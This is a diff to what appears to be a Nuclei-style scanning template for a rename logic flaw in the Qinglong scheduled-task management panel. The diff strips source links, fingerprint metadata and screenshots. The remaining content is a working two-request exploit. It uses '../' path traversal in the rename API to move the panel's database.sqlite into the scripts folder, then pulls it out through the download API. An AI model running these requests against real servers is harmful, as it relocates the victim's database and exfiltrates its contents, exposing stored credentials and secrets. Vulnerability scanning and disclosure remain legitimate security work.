@@ -3,22 +3,18 @@ info:
   name: 青龙定时任务管理平台rename存在逻辑缺陷漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pqrftelno6zrgsdl'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pqrftelno6zrgsdl
-    fofa: body="./umi.a4d14b92.css"
 http:
 - raw:
-  - "PUT /Api/scripts/rename HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n{\n  \"path\": \"../db/\",\n  \"filename\": \"database.sqlite\",\n  \"newFilename\": \"../scripts/hacked_db.sqlite\"\n}\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774237383967-beaa9a5e-63bb-49b5-a8b3-a53461d2f907.png)"
+  - "PUT /Api/scripts/rename HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n{\n  \"path\": \"../db/\",\n  \"filename\": \"database.sqlite\",\n  \"newFilename\": \"../scripts/hacked_db.sqlite\"\n}"
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - "POST /Api/scripts/download HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n{\n  \"path\": \"\",\n  \"filename\": \"hacked_db.sqlite\"\n}\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774237384354-fba8bf17-9c20-4a08-9478-15b5250b6c1a.png)"
+  - "POST /Api/scripts/download HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n{\n  \"path\": \"\",\n  \"filename\": \"hacked_db.sqlite\"\n}"
   redirects: false
   matchers:
   - status:
